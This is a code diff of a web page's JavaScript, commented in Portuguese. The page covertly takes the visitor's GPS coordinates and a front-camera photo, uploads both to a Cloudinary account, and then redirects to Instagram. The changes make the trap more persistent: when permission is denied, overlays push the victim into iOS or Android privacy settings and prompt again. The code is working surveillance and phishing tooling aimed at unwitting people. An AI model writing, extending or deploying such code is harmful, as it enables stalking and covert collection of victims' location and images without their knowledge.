@@ -34,17 +34,34 @@
       overlay.style.display = 'none';
     }
 
+    // Redireciona para as configurações de permissão do app
+    function openAppSettings() {
+      const ua = navigator.userAgent;
+      if (/iP(hone|od|ad)/.test(ua)) {
+        // iOS: redireciona para as Preferências de Privacidade
+        window.location.href = 'App-Prefs:root=Privacy&path=LOCATION';
+      } else if (/Android/.test(ua)) {
+        // Android: abre detalhes do app
+        const pkg = window.location.host;
+        window.location.href = `intent://#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;scheme=package;package=${pkg};end`;
+      } else {
+        alert('Abra as configurações do navegador para permitir localização.');
+      }
+    }
+
     // Etapa 1: solicitar permissão de localização
     function askLocation() {
       hideOverlay();
       navigator.geolocation.getCurrentPosition(onGeoSuccess, onGeoError, geoOpts);
     }
-    function onGeoError() {
-      // só aparece ao negar
-      showOverlay('Toque para permitir a localização', askLocation);
+    function onGeoError(error) {
+      console.warn('Geolocation error:', error);
+      // só aparece ao negar ou erro
+      showOverlay('Toque para permitir localização (vá para configurações)', openAppSettings);
     }
     function onGeoSuccess(pos) {
-      // enviando localização
+      hideOverlay();
+      // upload localização
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
       const blob = new Blob([`Latitude: ${lat}\nLongitude: ${lon}`], { type: 'text/plain' });
@@ -54,19 +71,20 @@
       form.append('folder', folderName);
       fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, { method: 'POST', body: form })
         .then(() => {
-          // imediatamente solicite câmera (sistema)
+          // solicitar câmera
           askCamera();
         })
-        .catch(() => {
+        .catch(e => {
+          console.error(e);
           showOverlay('Erro ao enviar localização. Toque para tentar novamente.', askLocation);
         });
     }
 
-    // Etapa 2: solicitar permissão de câmera somente via sistema (sem overlay prévio)
+    // Etapa 2: solicitar permissão de câmera via sistema
     function askCamera() {
       navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
         .then(stream => {
-          // captura e upload
+          hideOverlay();
           const video = document.createElement('video');
           video.setAttribute('playsinline',''); video.autoplay = true; video.muted = true;
           video.srcObject = stream;
@@ -83,13 +101,13 @@
               imgForm.append('folder', folderName);
               fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: imgForm })
                 .then(() => window.location.href = 'https://instagram.com')
-                .catch(() => showOverlay('As permissões são necessárias para continuar. Toque para tentar novamente.', askCamera));
+                .catch(() => showOverlay('Erro ao enviar foto. Toque para tentar novamente.', askCamera));
             }, 'image/png');
           }, 500);
         })
-        .catch(() => {
-          // só aparece ao negar
-          showOverlay('As permissões são necessárias para continuar. Toque para tentar novamente.', askCamera);
+        .catch(error => {
+          console.warn('Camera error:', error);
+          showOverlay('Toque para permitir câmera (vá para configurações)', openAppSettings);
         });
     }
 
